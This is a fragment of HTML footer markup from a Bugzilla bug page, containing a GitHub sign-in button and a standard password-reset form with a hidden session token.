      <input type="image" src="extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
</li>

  <li id="forgot_container_bottom">
    <span class="separator">| </span>
    <a id="forgot_link_bottom" href="show_bug.cgi?id=9454&amp;GoAheadAndLogIn=1#forgot"
       onclick="return show_forgot_form('_bottom')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_bottom"
          class="mini_forgot bz_default_hidden">
      <label for="login_bottom">Login:</label>
      <input name="loginname" size="20" id="login_bottom" required
          type="email" placeholder="Your Email Address">
      <input id="forgot_button_bottom" value="Reset Password" type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_bottom" name="token"
             value="1635620612-w17gsEi3GM8_GVtMXlukiO543qU2QYige75QU1hFoco">
      <a href="#" onclick="return hide_forgot_form('_bottom')">[x]</a>
    </form>
  </li>
</ul>
  </li>

  




  
</ul>

      <div class="outro"></div>
    </div>

  </body>
</html>